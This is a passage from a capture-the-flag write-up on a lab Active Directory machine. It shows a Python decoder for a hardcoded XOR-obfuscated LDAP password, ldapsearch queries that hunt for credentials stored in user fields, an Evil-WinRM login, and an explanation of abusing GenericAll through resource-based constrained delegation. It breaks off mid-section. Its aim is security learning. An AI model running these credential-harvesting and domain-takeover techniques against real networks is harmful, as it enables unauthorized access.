<li>The DN of the user to authenticate. This should be empty for anonymous simple authentication, and is typically empty for SASL authentication because most SASL mechanisms identify the target account in the encoded credentials. It must be non-empty for non-anonymous simple authentication.</li>
<li>The credentials for the user to authenticate. For simple authentication, this is the password for the user specified by the bind DN (or an empty string for anonymous simple authentication). For SASL authentication, this is an encoded value that contains the SASL mechanism name and an optional set of encoded SASL credentials.</li>
</ul>
</li>
</ul>
</blockquote>
<ul>
<li>This is important as it would appear that the password, is not being requested for on the CLI as there is no parameter for that which means it must be hard-coded.</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="finding-the-password-string">Finding the password string:</h4>
<ul>
<li>I search for <code>enc_password</code> which we saw earlier when we ran <code>strings</code> and get the below result:
<ul>
<li><figure><img src="/ox-hugo/2024-09-03-090041_.png">
</figure>
</li>
</ul>
</li>
</ul>
<h4 id="finding-the-function">Finding the function:</h4>
<ul>
<li>We can see that the variable is used in the <code>Protected</code> function so I search for that function:
<ul>
<li><figure><img src="/ox-hugo/2024-09-03-092433_.png">
</figure>
</li>
<li>So this was completley out of my wheelhouse in terms of experience, I have very rudimentary python programming experience at best &amp; I have no background in <code>C#</code>.
<ul>
<li><strong>But let&rsquo;s break it down so it&rsquo;s easier to understand</strong>.
<ul>
<li><!-- raw HTML omitted -->There are values<!-- raw HTML omitted -->:
<ul>
<li>There is a base64 encoded password
<ul>
<li><code>enc_password = &quot;0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E&quot;;</code></li>
</ul>
</li>
<li>A byte array (key) with the value:
<ul>
<li><code>&quot;armando&quot;</code></li>
</ul>
</li>
</ul>
</li>
<li><!-- raw HTML omitted -->A function<!-- raw HTML omitted --> (think this is technically a method?):
<ul>
<li>There is an array which the password is being passed to &amp; converted from base64:
<ul>
<li><code>byte[] array = Convert.FromBase64String(enc_password);</code></li>
</ul>
</li>
<li>A second array which has the value of the first array:
<ul>
<li><code>byte[] array2 = array;</code></li>
</ul>
</li>
<li>A for loop that is manipulating these with this piece of logic:
<ul>
<li><code>array2[i] = (byte)((uint)(array[i] ^ key[i % key.Length]) ^ 0xDFu);</code></li>
</ul>
</li>
<li>It then returns array2 using &ldquo;GetString&rdquo; (which I am guessing is a decoded password)
<ul>
<li><code>return Encoding.Default.GetString(array2)</code></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>This is on it&rsquo;s surface seems quite simple, we take two values, <code>key</code> &amp; <code>enc_password</code> apply the following logic <code>array2[i] = (byte)((uint)(array[i] ^ key[i % key.Length]) ^ 0xDFu);</code> &amp; get a password……but how?</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="decoding-the-logic">Decoding the logic:</h4>
<p>So this took me on a deep dive as I had no idea what was going on &amp; had to decode this function line by line:</p>
<h5 id="static-elements">Static elements:</h5>
<ul>
<li>Password:
<ul>
<li><code>private static string enc_password = &quot;0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E&quot;;</code></li>
<li>The base64 encrypted password.</li>
</ul>
</li>
<li>Key:
<ul>
<li><code>private static byte[] key = Encoding.ASCII.GetBytes(&quot;armando&quot;);</code></li>
<li>A byte array created from the string &ldquo;armando&rdquo;, which will be used as the decryption key.</li>
</ul>
</li>
</ul>
<h5 id="function-method-explanation">Function/Method Explanation:</h5>
<!-- raw HTML omitted -->
<ul>
<li>
<ol>
<li>Base64 Decoding:</li>
</ol>
<ul>
<li>The encrypted password (<code>enc_password</code>) is a Base64 encoded string.
<ul>
<li><code>byte[] array = Convert.FromBase64String(enc_password);</code> converts this string back into a byte array (<code>array</code>).</li>
</ul>
</li>
</ul>
</li>
</ul>
<!-- raw HTML omitted -->
<ul>
<li>
<ol start="2">
<li>Decryption Process: (The Magic)</li>
</ol>
<ul>
<li>The code loops through each byte of the array (array), performing two XOR operations on each byte: The XOR symbol in <code>C#</code> sharp is <code>^</code>. This part is what took me longest as I did not have any clue about XOR as a concept as it had never come up for me.
<ul>
<li>
<p><strong>What is XOR?</strong></p>
<ul>
<li>XOR (Exclusive OR) is a bitwise operation that takes two bits and returns <code>1</code> (True) if the bits are different, and <code>0</code> (False) if they are the same.</li>
<li><!-- raw HTML omitted -->For example<!-- raw HTML omitted -->:
<ul>
<li>1 XOR 0 = 1 (True)</li>
<li>0 XOR 1 = 1 (True)</li>
<li>1 XOR 1 = 0 (False)</li>
<li>0 XOR 0 = 0 (False)</li>
</ul>
</li>
</ul>
<p>Microsoft have a handy explanation:</p>
<ul>
<li><a href="https://learn.microsoft.com/en-us/dotnet/csharp/language-reference/operators/boolean-logical-operators#logical-exclusive-or-operator-">https://learn.microsoft.com/en-us/dotnet/csharp/language-reference/operators/boolean-logical-operators#logical-exclusive-or-operator-</a></li>
</ul>
</li>
</ul>
</li>
</ul>
<p><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted -->_<!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --></p>
<ol>
<li>
<p><strong>XOR Operation 1 in the function</strong>:</p>
<ul>
<li><code>array2[i] = (byte)((uint)(array[i] ^ key[i % key.Length])</code>
<ul>
<li>This operation is the first step in decrypting the data.</li>
</ul>
</li>
</ul>
<p><strong>Details</strong>:</p>
<ol>
<li>
<p>Access the <code>i</code>-th Byte:</p>
<ul>
<li><code>array[i]</code> refers to the <code>i</code>-th byte of the encrypted byte array (derived from the Base64 decoded password).</li>
<li><code>key[i % key.Length]</code> refers to the corresponding byte from the decryption key.</li>
<li><code>%</code> The (modulus) operator ensures that if <code>i</code> is greater than the length of the key, it wraps around to the beginning of the key to start again.</li>
</ul>
</li>
<li>
<p>XOR with <code>Key</code> Byte:</p>
<ul>
<li>The encrypted byte in <code>array[i]</code> is XORed with the corresponding byte from the key.</li>
<li>This is the first step to reversing the scrambling of the data. This operation undoes the initial encryption that mixed the original data with the key during encryption. By applying the same key in reverse, this step partially restores the original data.</li>
</ul>
</li>
</ol>
<p><strong>Example Using Simple Hex Value</strong>:</p>
<ul>
<li>This is just to show how it works, not what is happening here.</li>
<li>If <code>array[i] is 0x5A (binary 01011010)</code>, and <code>key[i % key.Length]</code> is <code>0x41 (binary 01000001)</code>,
<table>
  <thead>
      <tr>
          <th style="text-align: left">Bit</th>
          <th style="text-align: left">Pass (0x5A)</th>
          <th style="text-align: left">Key (0x41)</th>
          <th style="text-align: left">XOR Result (0x1B)</th>
          <th style="text-align: left">True/False</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td style="text-align: left">Bit 7 (MSB)</td>
          <td style="text-align: left">0</td>
          <td style="text-align: left">0</td>
          <td style="text-align: left">0</td>
          <td style="text-align: left">False</td>
      </tr>
      <tr>
          <td style="text-align: left">Bit 6</td>
          <td style="text-align: left">1</td>
          <td style="text-align: left">1</td>
          <td style="text-align: left">0</td>
          <td style="text-align: left">False</td>
      </tr>
      <tr>
          <td style="text-align: left">Bit 5</td>
          <td style="text-align: left">0</td>
          <td style="text-align: left">0</td>
          <td style="text-align: left">0</td>
          <td style="text-align: left">False</td>
      </tr>
      <tr>
          <td style="text-align: left">Bit 4</td>
          <td style="text-align: left">1</td>
          <td style="text-align: left">0</td>
          <td style="text-align: left">1</td>
          <td style="text-align: left">True</td>
      </tr>
      <tr>
          <td style="text-align: left">Bit 3</td>
          <td style="text-align: left">1</td>
          <td style="text-align: left">0</td>
          <td style="text-align: left">1</td>
          <td style="text-align: left">True</td>
      </tr>
      <tr>
          <td style="text-align: left">Bit 2</td>
          <td style="text-align: left">0</td>
          <td style="text-align: left">0</td>
          <td style="text-align: left">0</td>
          <td style="text-align: left">False</td>
      </tr>
      <tr>
          <td style="text-align: left">Bit 1</td>
          <td style="text-align: left">1</td>
          <td style="text-align: left">0</td>
          <td style="text-align: left">1</td>
          <td style="text-align: left">True</td>
      </tr>
      <tr>
          <td style="text-align: left">Bit 0 (LSB)</td>
          <td style="text-align: left">0</td>
          <td style="text-align: left">1</td>
          <td style="text-align: left">1</td>
          <td style="text-align: left">True</td>
      </tr>
  </tbody>
</table>
</li>
</ul>
</li>
<li>
<p><strong>XOR Operation 2</strong>:</p>
<ul>
<li><code>^ 0xDFu</code>
<ul>
<li>This operation completes the decryption by reversing the final layer of encryption.</li>
</ul>
</li>
</ul>
<p><strong>Details</strong>:</p>
<ol>
<li>
<p><strong>Hexadecimal XOR</strong>:</p>
<ul>
<li>After the first XOR operation, the result is XORed again with hexidecimal value of <code>0xDF</code>, which is the binary value 11011111.</li>
</ul>
</li>
<li>
<p><strong>Final XOR Operation</strong>:</p>
<ul>
<li>This is the final step in reversing the scrambling of the data. It undoes the last layer during encryption, restoring the byte to its original, unencrypted value. By XORing with 0xDF, it reverses the effect of the same XOR operation that was applied during encryption.</li>
</ul>
</li>
</ol>
<p><strong>Example (continuing from above)</strong>:</p>
<table>
  <thead>
      <tr>
          <th style="text-align: left">Bit Position</th>
          <th style="text-align: left">Pass (0x5A)</th>
          <th style="text-align: left">Key (0x41)</th>
          <th style="text-align: left">XOR Result (0x1B)</th>
          <th style="text-align: left">True/False</th>
          <th style="text-align: left">Second XOR Operation</th>
          <th style="text-align: left">Key (0xDF)</th>
          <th style="text-align: left">Final XOR Result (0xC4)</th>
          <th style="text-align: left">True/False</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td style="text-align: left">Bit 7 (MSB)</td>
          <td style="text-align: left">0</td>
          <td style="text-align: left">0</td>
          <td style="text-align: left">0</td>
          <td style="text-align: left">False</td>
          <td style="text-align: left">00011011</td>
          <td style="text-align: left">1</td>
          <td style="text-align: left">1</td>
          <td style="text-align: left">True</td>
      </tr>
      <tr>
          <td style="text-align: left">Bit 6</td>
          <td style="text-align: left">1</td>
          <td style="text-align: left">1</td>
          <td style="text-align: left">0</td>
          <td style="text-align: left">False</td>
          <td style="text-align: left">00011011</td>
          <td style="text-align: left">1</td>
          <td style="text-align: left">1</td>
          <td style="text-align: left">True</td>
      </tr>
      <tr>
          <td style="text-align: left">Bit 5</td>
          <td style="text-align: left">0</td>
          <td style="text-align: left">0</td>
          <td style="text-align: left">0</td>
          <td style="text-align: left">False</td>
          <td style="text-align: left">00011011</td>
          <td style="text-align: left">0</td>
          <td style="text-align: left">0</td>
          <td style="text-align: left">False</td>
      </tr>
      <tr>
          <td style="text-align: left">Bit 4</td>
          <td style="text-align: left">1</td>
          <td style="text-align: left">0</td>
          <td style="text-align: left">1</td>
          <td style="text-align: left">True</td>
          <td style="text-align: left">00011011</td>
          <td style="text-align: left">1</td>
          <td style="text-align: left">0</td>
          <td style="text-align: left">False</td>
      </tr>
      <tr>
          <td style="text-align: left">Bit 3</td>
          <td style="text-align: left">1</td>
          <td style="text-align: left">0</td>
          <td style="text-align: left">1</td>
          <td style="text-align: left">True</td>
          <td style="text-align: left">00011011</td>
          <td style="text-align: left">1</td>
          <td style="text-align: left">0</td>
          <td style="text-align: left">False</td>
      </tr>
      <tr>
          <td style="text-align: left">Bit 2</td>
          <td style="text-align: left">0</td>
          <td style="text-align: left">0</td>
          <td style="text-align: left">0</td>
          <td style="text-align: left">False</td>
          <td style="text-align: left">00011011</td>
          <td style="text-align: left">1</td>
          <td style="text-align: left">1</td>
          <td style="text-align: left">True</td>
      </tr>
      <tr>
          <td style="text-align: left">Bit 1</td>
          <td style="text-align: left">1</td>
          <td style="text-align: left">0</td>
          <td style="text-align: left">1</td>
          <td style="text-align: left">True</td>
          <td style="text-align: left">00011011</td>
          <td style="text-align: left">1</td>
          <td style="text-align: left">0</td>
          <td style="text-align: left">False</td>
      </tr>
      <tr>
          <td style="text-align: left">Bit 0 (LSB)</td>
          <td style="text-align: left">0</td>
          <td style="text-align: left">1</td>
          <td style="text-align: left">1</td>
          <td style="text-align: left">True</td>
          <td style="text-align: left">00011011</td>
          <td style="text-align: left">1</td>
          <td style="text-align: left">0</td>
          <td style="text-align: left">False</td>
      </tr>
  </tbody>
</table>
</li>
<li>
<p><strong>Summary of the Two XOR Operations</strong>:</p>
<ul>
<li>First XOR (with the key):
<ul>
<li>The encrypted byte is XORed with the corresponding byte from the key.</li>
<li>This operation &ldquo;removes&rdquo; the encryption that was applied using this key.</li>
<li>It reverses the step where each byte of the original password was XORed with the key to produce an intermediate decrypted byte.</li>
</ul>
</li>
<li>Second XOR (with 0xDF):
<ul>
<li>The result of the first XOR operation is then XORed with the fixed value 0xDF.</li>
<li>This step &ldquo;undoes&rdquo; the final layer of encryption that was applied when the original password was encrypted.</li>
<li>The combination of these two XORs returns the byte back to its original (clear text) state before it was encrypted.</li>
</ul>
</li>
</ul>
</li>
</ol>
</li>
</ul>
<!-- raw HTML omitted -->
<ul>
<li>
<ol start="3">
<li>Conversion to String:</li>
</ol>
<ul>
<li>After all bytes have been processed, the resulting byte array (array2) is converted back into a string using:
<ul>
<li><code>return Encoding.Default.GetString(array2);</code>.</li>
<li>This string is the original decrypted password.</li>
</ul>
</li>
</ul>
</li>
</ul>
<!-- raw HTML omitted -->
<ul>
<li>
<ol start="4">
<li>Returning the Password:</li>
</ol>
<ul>
<li>Finally, the decrypted password string is returned by the <code>getPassword()</code> method.</li>
</ul>
</li>
</ul>
<!-- raw HTML omitted -->
<ul>
<li>
<ol start="5">
<li>In Simple Terms:</li>
</ol>
<ul>
<li>The code takes an encrypted password stored as a Base64 string.
<ul>
<li>It converts it into bytes and then decrypts it using a key (&ldquo;armando&rdquo;) and a specific XOR operation.</li>
<li>The decrypted result is then converted back into a readable string, which is the original password.</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="coding-a-decoder-in-python">Coding a Decoder in python:</h4>
<ul>
<li>So we know how the encryption &amp; decryption process works, we now need to code this ourselves. As I have some experience in Python lets use that.</li>
</ul>
<!-- raw HTML omitted -->







<div class="codeblock">
    
        <div class="copy-button-box">
            <button class="copy-button" state="copy" data="%0aimport%20base64%20%20#%20Importing%20the%20base64%20module%20to%20handle%20base64%20encoding%20and%20decoding%0a%0afrom%20itertools%20import%20cycle%20%20#%20Importing%20the%20cycle%20function%20from%20itertools%20to%20cycle%20through%20the%20key%0a%0a#%20Decoding%20the%20base64%20encoded%20string%20into%20bytes.%0aencPassword%20=%20base64.b64decode%28%220Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y&#43;U193E%22%29%0a%0a#%20Defining%20the%20key%20as%20a%20byte%20string%20which%20will%20be%20used%20in%20the%20XOR%20operation%20for%20decryption.%0akey%20=%20b%22armando%22%0a%0a#%20Defining%20the%20hexvalue%20%220xDFu%22%20key%20as%20an%20integer%20value.%20For%20our%20second%20round%20of%20XOR%0akey2%20=%20223%0a%0adecryptedPass%20=%20%27%27%0a%0afor%20byteEncPass,%20byteKey%20in%20zip%28encPassword,%20cycle%28key%29%29:%0a%0a%20%20%20%20decryptedPass%20&#43;=%20chr%28byteEncPass%20%5e%20byteKey%20%5e%20key2%29%0a%0a#%20Printing%20the%20final%20decrypted%20result.%0a%0aprint%28decryptedPass%29">
                <i class="bi bi-copy"></i>
            </button>
        </div>
    

    
        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> base64  <span style="color:#75715e"># Importing the base64 module to handle base64 encoding and decoding</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> itertools <span style="color:#f92672">import</span> cycle  <span style="color:#75715e"># Importing the cycle function from itertools to cycle through the key</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Decoding the base64 encoded string into bytes.</span>
</span></span><span style="display:flex;"><span>encPassword <span style="color:#f92672">=</span> base64<span style="color:#f92672">.</span>b64decode(<span style="color:#e6db74">&#34;0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Defining the key as a byte string which will be used in the XOR operation for decryption.</span>
</span></span><span style="display:flex;"><span>key <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;armando&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Defining the hexvalue &#34;0xDFu&#34; key as an integer value. For our second round of XOR</span>
</span></span><span style="display:flex;"><span>key2 <span style="color:#f92672">=</span> <span style="color:#ae81ff">223</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>decryptedPass <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> byteEncPass, byteKey <span style="color:#f92672">in</span> zip(encPassword, cycle(key)):
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    decryptedPass <span style="color:#f92672">+=</span> chr(byteEncPass <span style="color:#f92672">^</span> byteKey <span style="color:#f92672">^</span> key2)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Printing the final decrypted result.</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print(decryptedPass)</span></span></code></pre></div>
    
</div>
<h5 id="code-breakdown">Code Breakdown:</h5>
<ul>
<li>
<p><strong>Imports:</strong></p>
<ul>
<li><code>import base64</code>:
<ul>
<li>Imports the <code>base64</code> module for handling base64 encoding and decoding.</li>
</ul>
</li>
<li><code>from itertools import cycle</code>:
<ul>
<li>Imports the `cycle` function from `itertools` to create an infinite iterator that cycles through the key.</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>Decoding Base64 Encoded String:</strong></p>
<ul>
<li><code>encPassword = base64.b64decode(&quot;0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E&quot;)</code>:
<ul>
<li>Decodes the base64 encoded string into a byte sequence (`encPassword`).</li>
<li>`encPassword` will hold the decoded binary data that needs to be decrypted.</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>Key Definitions:</strong></p>
<ul>
<li><code>key = b&quot;armando&quot;</code>:
<ul>
<li>Defines the <code>key</code> &ldquo;<code>armando</code> as a byte string which will be used in the first XOR decryption process.</li>
</ul>
</li>
<li><code>key2 = 223</code>:
<ul>
<li>Defines the second key, which is just the decimal representation of the hex value <code>0xDFu</code> which will be used in the second XOR operation during decryption.</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>Decryption Process:</strong></p>
<ul>
<li>
<p><code>decryptedPass = ''</code>:</p>
<ul>
<li>Initializes an empty string <code>decryptedPass</code> to store the decrypted result.</li>
</ul>
</li>
<li>
<p><strong>Looping and Decrypting:</strong></p>
<ul>
<li>
<p><code>for byteEncPass, byteKey in zip(encPassword, cycle(key)):</code>:</p>
<ul>
<li>Loops through each byte of the <code>encPassword</code> and pairs it with each byte of the <code>key</code> using the <code>zip()</code> function.</li>
<li>If the <code>key</code> is shorter than <code>encPassword</code> it will repeat the key indefinately <code>cycle(key)</code>:
<ul>
<li>This is necessary as the key <code>armando</code> is shorter than the base64 decoded string.</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>XOR Decryption:</strong></p>
<ul>
<li><code>decryptedPass += chr(byteEncPass ^ byteKey ^ key2)</code>:
<ul>
<li>Decrypts each byte by performing an XOR operation between:
<ul>
<li><code>byteEncPass</code> (current byte from <code>encPassword</code>),</li>
<li><code>byteKey</code> (corresponding byte from `key`),</li>
<li><code>key2</code> (second key).</li>
</ul>
</li>
<li>Converts the result of the two XOR operation to a character using <code>chr()</code> and appends those to our variable <code>decryptedPass</code>.</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>Output:</strong></p>
<ul>
<li><code>print(decryptedPass)</code>:
<ul>
<li>Prints the final decrypted string (<code>decryptedPass</code>) which is the original password before encoding and encryption.</li>
</ul>
</li>
</ul>
</li>
</ul>
<h5 id="running-the-script-and-get-the-password">Running the script and get the password:</h5>
<ul>
<li>I run my script and it appears to have reversed the encryption &amp; spat out a clear text ldap password!
<ul>
<li><figure><img src="/ox-hugo/2024-09-04-181138_.png">
</figure>
</li>
</ul>
</li>
</ul>
<h2 id="2-dot-foothold">2. Foothold:</h2>
<h3 id="enumerating-the-domain-using-ldap">Enumerating the Domain using LDAP:</h3>
<ul>
<li>As we now have a foothold in the domain we can query it using standard LDAP queries:
<ul>
<li>
<p><strong>Dump All Domain Data</strong>:</p>
<ul>
<li>I initially dump everything I can with the following command:</li>
<li><code>ldapsearch -H ldap://$box -D ldap@support.htb -w '&lt;Password&gt;' -b &quot;dc=support,dc=htb&quot; &quot;*&quot; &gt;&gt; ldapDump.txt</code>
<ul>
<li>I dump all information like this as sometimes it&rsquo;s just good to grab everything all at once in-case we hit a dead end and then need to run some searches on it.</li>
<li><figure><img src="/ox-hugo/2024-09-04-183629_.png">
</figure>
</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>Dump All Users whos description field is not blank</strong>:</p>
<ul>
<li>I also run the following command that will return all users who&rsquo;s description field is not blank.
<ul>
<li><code>ldapsearch -H ldap://$box -D ldap@support.htb -w '&lt;Password&gt;' -b &quot;dc=support,dc=htb&quot; -s sub &quot;(&amp;(objectClass=user)(description=*))&quot;</code>
<ul>
<li>I like this query as it&rsquo;s an easy way to pull credentials if they are stored in the description field, unfortunately there was nothing there this time.</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="finding-passwords-in-user-fields">Finding Passwords in User Fields:</h3>
<ul>
<li>
<p><strong>I Dump all user information</strong>:</p>
<ul>
<li>I run this query to dump all the user information and sAMAccount name too:
<ul>
<li><code>ldapsearch -H ldap://$box -D ldap@support.htb -w '&lt;Password&gt;' -b &quot;dc=support,dc=htb&quot; -s sub &quot;(&amp;(objectClass=user)(sAMAccountName=*))&quot;</code></li>
</ul>
</li>
<li>After sifting through it I find this which looks like a password in the information field for the &ldquo;support&rdquo; account:
<ul>
<li><figure><img src="/ox-hugo/2024-09-04-184502_.png">
</figure>
</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>Verify if the password is valid using netex</strong>:</p>
<ul>
<li>I verify if it is valid using netexec:
<ul>
<li><figure><img src="/ox-hugo/2024-09-05-072852_.png">
</figure>

<ul>
<li>IT IS!! We have a valid way into the domain!</li>
</ul>
</li>
<li><del>Note</del>:
<ul>
<li>Due to this discovery I have now added the below search to my notes so that in future I also check the &ldquo;info&rdquo; field for passwords:
<ul>
<li><code>ldapsearch -H ldap://$box -D ldap@&lt;domain&gt;.&lt;domain&gt; -w '&lt;Password&gt;' -b &quot;dc=&lt;domain&gt;,dc=&lt;domain&gt;&quot; -s sub &quot;(&amp;(objectClass=user)(info=*))&quot;</code></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="connecting-with-evil-winrm">Connecting with Evil-WinRM:</h3>
<ul>
<li>I connect to the domain using evil-winrm as ports 5985/5986 are both open and running.
<ul>
<li><figure><img src="/ox-hugo/2024-09-05-073837_.png">
</figure>
</li>
</ul>
</li>
</ul>
<h2 id="3-dot-priv-esc">3. Priv-Esc:</h2>
<h3 id="enumerating-the-domain-with-bloodhound">Enumerating the domain with bloodhound:</h3>
<ul>
<li>
<p>I upload <code>SharpHound.exe</code> using Evil-WinRM and begin scanning the domain.</p>
<ul>
<li><figure><img src="/ox-hugo/2024-09-05-074255_.png">
</figure>
</li>
</ul>
</li>
<li>
<p><strong>Checking for nested group memberships</strong>:</p>
<ul>
<li>Whilst bloodhound is running I check what nested groups the user we control is a part of.
<ul>
<li>
<p>(This will show up in bloodhound, however running this early will tell us if we are part of any known high value windows groups and can provide a clear path to domain takeover.)</p>
</li>
<li>
<p><code>Command</code>: <code>ldapsearch -H ldap://$box -D ldap@support.htb -w '&lt;Password&gt;' -b &quot;dc=support,dc=htb&quot; -s sub &quot;(member:1.2.840.113556.1.4.1941:=CN=support,CN=Users,DC=support,DC=htb)&quot;</code></p>
<ul>
<li><figure><img src="/ox-hugo/2024-09-05-081114_.png">
</figure>
</li>
</ul>
</li>
<li>
<p><strong>Explanation</strong>:</p>
<ul>
<li><code>&quot;(member:1.2.840.113556.1.4.1941:=CN=support,CN=Users,DC=support,DC=htb)&quot;</code>:
<ul>
<li>This filter leverages the <code>LDAP_MATCHING_RULE_IN_CHAIN</code> rule.
<ul>
<li>The OID being <code>(1.2.840.113556.1.4.1941)</code></li>
</ul>
</li>
<li>It  searches for members recursively across group memberships.</li>
<li>So it checks if the object CN=support,CN=Users,DC=support,DC=htb is a member of any groups, directly or indirectly.</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>Result</strong>:</p>
<ul>
<li>It shows that user we control is actually part of a group called <code>&quot;Shared Support Accounts&quot;</code>
<ul>
<li>This is not a standard group in AD, but it&rsquo;s a discovery none the less.
<ul>
<li><figure><img src="/ox-hugo/2024-09-05-081251_.png">
</figure>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="genericall-privileges-on-the-domain-controller-dot"><code>GenericAll</code> privileges on the domain controller.</h3>
<ul>
<li>
<p>In bloodhound we can see our user has the <code>GenericAll</code> privilege over the Domain Controller, due to the fact that they are part of the &ldquo;Shared Support Accounts&rdquo; group.</p>
<ul>
<li><figure><img src="/ox-hugo/2024-09-05-081636_.png">
</figure>
</li>
</ul>
</li>
<li>
<p>If you are unfamiliar with the <code>GenericAll</code> privilege, it&rsquo;s incredibly powerful and dangerous.</p>
<ul>
<li><strong>Display Name</strong>: <code>GenericAll</code></li>
<li><strong>Common Name</strong>: <code>GA/RIGHT_GENERIC_ALL</code></li>
<li><strong>Hex Value</strong>: <code>0x10000000</code></li>
<li><strong>Interpretation</strong>: Allows creating or deleting child objects, deleting a sub-tree, reading and writing properties, examining child objects and the object itself, adding and removing the object from the directory, and reading or writing with an extended right.
<ul>
<li>This is equivalent to the object-specific access rights bits (DE | RC | WD | WO | CC | DC | DT | RP | WP | LC | LO | CR | VW) for AD objects.</li>
<li><strong>In simple terms</strong>:
<ul>
<li>This is also known as full control. This permission allows the trustee to manipulate the target object however they wish.</li>
</ul>
</li>
<li><strong>Attack Options</strong>:
<ul>
<li><strong>Users</strong>:
<ul>
<li>If we have this privilege over a user we can use a targeted kerberoasting attack &amp; add an SPN to the user, request that ticket and then crack it offline.</li>
</ul>
</li>
<li><strong>Groups</strong>:
<ul>
<li>We can then add ourselves or other users to the group, this is especially useful if the group grants privileges by virtue of membership.</li>
</ul>
</li>
<li><strong>Computers</strong>:
<ul>
<li>We can perform a Resource Based Constrained Delegation attack.
<ul>
<li><a href="https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution">https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution</a></li>
<li>We add a fake computer to the domain &amp; configure the computer we have <code>GenericAll</code> permissions over to allow our fake computer to act on behalf of it. This enables us to impersonate a high-privileged user on the domain and request a kerberos ticket for that user we can then either crack or use it in a pass the ticket attack.</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="resource-based-constrained-delegation-crash-course">Resource Based Constrained Delegation Crash Course:</h4>
<ul>
<li>Resource-based Constrained Delegation (RBCD) is a feature in Windows Active Directory that allows services to impersonate users under specific conditions. It&rsquo;s an advanced way to handle delegation where permissions are more controlled compared to older methods.</li>
</ul>
<h5 id="key-differences-from-basic-constrained-delegation">Key Differences from Basic Constrained Delegation:</h5>
<ul>
<li><strong>Basic Constrained Delegation</strong>: Allows a service to impersonate any user to another service.
<ul>
<li>Example: If Service A has permission, it can act as any user when accessing Service B.</li>
</ul>
</li>
<li>RBCD: Instead of granting Service A permission to impersonate users, you set permissions on the resource (like Service B) itself, determining which services (like Service A) can impersonate users.
<ul>
<li>The resource (Service B) has an attribute called msDS-AllowedToActOnBehalfOfOtherIdentity. This lists services that can impersonate users for this resource.</li>
</ul>
</li>
</ul>
<h5 id="why-it-s-important">Why It&rsquo;s Important:</h5>
<ul>
<li>With RBCD, <strong>no domain admin rights are needed to configure it</strong>. Anyone with write permissions to a computer account can modify this setting.</li>
